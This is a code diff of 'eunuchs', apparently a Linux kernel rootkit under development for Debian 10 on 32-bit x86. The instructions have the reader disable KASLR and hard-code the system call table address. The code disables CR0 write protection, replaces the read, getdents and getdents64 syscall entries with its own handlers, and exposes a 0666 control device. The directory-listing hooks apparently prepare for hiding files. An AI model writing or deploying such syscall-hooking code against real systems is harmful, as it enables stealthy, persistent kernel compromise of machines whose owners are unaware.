@@ -2,19 +2,14 @@
  * Targets Debian 10, x86-32bit
  * Kernel 4.19.0
  *
- * From https://www.kernel.org/doc/html/v4.15/admin-guide/kernel-signing.html
- * This module needs to be signed to avoid tainting the kernel.
- * To do so:
  *
- * openssl req -new -nodes -utf8 -sha256 -days 36500 -batch -x509 \
- *      -config x509.genkey -outform PEM -out kernel_key.pem \
- *      -keyout kernel_key.pem
- *
- * scripts/sign-file sha256 kernel-signkey.priv \
- *      kernel-signkey.x509 eunuchs.ko
- *
- * TODO: figure out how to import keys or be able to use a newly generated one
+ * As root...
+ * 1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
+ * 2. execute `update-grub`
+ * 3. `grep sys_call_table /boot/System.map-$(uname -r)` to
+ *    find the address of the system call table and change the value below
  */
+static unsigned long *sct = 0xc167b180;
 
 #include <linux/init.h>
 #include <linux/module.h>
@@ -25,42 +20,48 @@
 #include <linux/cdev.h>
 #include <linux/types.h>
 #include <linux/fs.h>
+#include <linux/string.h>
+#include <linux/dirent.h>
+#include <linux/list.h>
 
 #include "eunuchs.h"
 
-MODULE_AUTHOR("yes");
+MODULE_AUTHOR("meow?");
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("yes");
+MODULE_DESCRIPTION("yeth plz");
 MODULE_VERSION("1.0");
-MODULE_ALIAS("yes");
+MODULE_ALIAS("kthnxbye");
 
 /* This is the original value of CR0 */
 static unsigned original_cr0;
 
+////////////////////////////////////////////////////////////////////////////////
 /* CHAR DEVICE */
 static struct class *eunuchs_cl;    // for class descriptor
 static int eunuchs_dev_maj_number;  // major number for device
 
-int eunuchs_char_open(struct inode *i, struct file *f)
-{
-    /* printk("device open()\n"); */
-    return 0;
-}
-
-int eunuchs_char_release(struct inode *i, struct file *f)
-{
-    /* printk("device release()\n"); */
-    return 0;
-}
-
-ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off)
-{
-    /* printk("device read()\n"); */
-    debug("read() got [%s] [%d bytes]\n", buf, len);
-    return 0;
-}
+/* int eunuchs_char_open(struct inode *i, struct file *f) */
+/* { */
+/*     [> printk("device open()\n"); <] */
+/*     return 0; */
+/* } */
+/*  */
+/* int eunuchs_char_release(struct inode *i, struct file *f) */
+/* { */
+/*     [> printk("device release()\n"); <] */
+/*     return 0; */
+/* } */
+/*  */
+/* ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *off) */
+/* { */
+/*     [> printk("device read()\n"); <] */
+/*     debug("read() got [%s] [%d bytes]\n", buf, len); */
+/*     return 0; */
+/* } */
 
 /**
+ * eunuchs_char_write(struct file*, char *, size_t, loff_t *) -
+ *
  * This is our handler for writing to /dev/euchar. This can be written to by
  * `echo 'a' > /dev/euchar` as root.
  *
@@ -71,7 +72,6 @@ ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, loff_t *
  **/
 ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
 {
-    /* printk("device write()\n"); */
     char a[len+1];
     size_t i;
 
@@ -91,13 +91,16 @@ ssize_t eunuchs_char_write(struct file *f, const char __user *buf, size_t len, l
 static struct file_operations eunuchs_fops =
 {
     .owner = THIS_MODULE,
-    .read = eunuchs_char_read,
+    /* .read = eunuchs_char_read, */
     .write = eunuchs_char_write,
-    .open = eunuchs_char_open,
-    .release = eunuchs_char_release
+    /* .open = eunuchs_char_open, */
+    /* .release = eunuchs_char_release */
 };
 
-/* changes the permissions on the char device to be 0666 */
+/**
+ * eunuchs_devnode(struct device*, umode_t*) -
+ *  Changes the permissions on the char device to be 0666
+ **/
 char* eunuchs_devnode(struct device *dev, umode_t *mode)
 {
     if(mode)
@@ -105,7 +108,10 @@ char* eunuchs_devnode(struct device *dev, umode_t *mode)
     return NULL;
 }
 
-/* Creates a char device so that we can communicate with the lkm from userland */
+/**
+ * eunuchs_dev_init() - 
+ *  Creates a char device so that we can communicate with the lkm from userland
+ **/
 int eunuchs_dev_init()
 {
     if((eunuchs_dev_maj_number = register_chrdev(0, EUNUCHS_DEVICE_NAME, &eunuchs_fops)) < 0)
@@ -134,35 +140,58 @@ int eunuchs_dev_init()
     return 0;
 }
 
-/* Removes the char device */
+/**
+ * enuchs_dev_remove() -
+ *  Removes the char device
+ **/
 int eunuchs_dev_remove()
 {
     device_destroy(eunuchs_cl, MKDEV(eunuchs_dev_maj_number, 0));
-    class_unregister(eunuchs_cl);
     class_destroy(eunuchs_cl);
     unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
     debug("device removed\n");
     return 0;
 }
 
-/*
- * As root...
- * 1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
- * 2. execute `update-grub`
- * 3. `grep sys_call_table /boot/System.map-$(uname -r)` to
- *    find the address of the system call table and change the value below
- */
-static unsigned long *sct = 0xc167b180;
-
+////////////////////////////////////////////////////////////////////////////////
 /* Pointers to save the original functions to. */
 static typeof(sys_read) *orig_read;
+static typeof(sys_getdents) *orig_getdents;
+static typeof(sys_getdents64) *orig_getdents64;
+
+/**
+ * read() handler
+ **/
 asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
 {
     /* printk("reading..\n"); */
     return orig_read(fd, buf, count);
 }
 
-/* Twiddles CR0 to enable writing to read-only memory */
+/**
+ * getdents() handler. Probably not needed. What calls this explicitly?
+ **/
+asmlinkage int eunuchs_getdents(unsigned int fd, struct linux_dirent __user *fp, unsigned int count)
+{
+    debug("got getdents call\n");
+    return orig_getdents(fd, fp, count);
+}
+
+/**
+ * getdents64() handler. This is used for large filesystems, and seems to be
+ * what ls uses.
+ **/
+asmlinkage int eunuchs_getdents64(unsigned int fd, struct linux_dirent64 __user *fp, unsigned int count)
+{
+    debug("got getdents64 call\n");
+    return orig_getdents64(fd, fp, count);
+}
+
+////////////////////////////////////////////////////////////////////////////////
+/**
+ * cr0_enable_write() -
+ *  Twiddles CR0 to enable writing to read-only memory
+ **/
 void cr0_enable_write()
 {
     unsigned cr0 = 0;
@@ -176,7 +205,10 @@ void cr0_enable_write()
                  :"a"(cr0));
 }
 
-/* Twiddles CR0 to disable writing to read-only memory */
+/**
+ * cr0_disable_write() -
+ *  Twiddles CR0 to disable writing to read-only memory
+ **/
 void cr0_disable_write()
 {
     debug("restoring write protection on cr0\n");
@@ -185,21 +217,36 @@ void cr0_disable_write()
                  :"a"(original_cr0));
 }
 
-/* Installs our hooks, saving the old system call function pointers */
+/**
+ * eunuchs_hooks_install() -
+ *  Installs our hooks, saving the old system call function pointers 
+ **/
 int eunuchs_hooks_install()
 {
     debug("installing hooks\n");
+
     orig_read = (typeof(sys_read) *)sct[__NR_read];
     sct[__NR_read] = (void *)&eunuchs_read;
+
+    orig_getdents = (typeof(sys_getdents) *)sct[__NR_getdents];
+    sct[__NR_getdents] = (void *)&eunuchs_getdents;
+
+    orig_getdents64 = (typeof(sys_getdents64) *)sct[__NR_getdents64];
+    sct[__NR_getdents64] = (void *)&eunuchs_getdents64;
 
     return 0;
 }
 
-/* Removes our hooks, restoring the original system call function pointers */
+/**
+ * eunuchs_hooks_remove() -
+ *  Removes our hooks, restoring the original system call function pointers.
+ **/
 void eunuchs_hooks_remove()
 {
     debug("removing hooks\n");
     sct[__NR_read] = (void *)orig_read;
+    sct[__NR_getdents] = (void *)orig_getdents;
+    sct[__NR_getdents64] = (void *)orig_getdents64;
 }
 
 /**
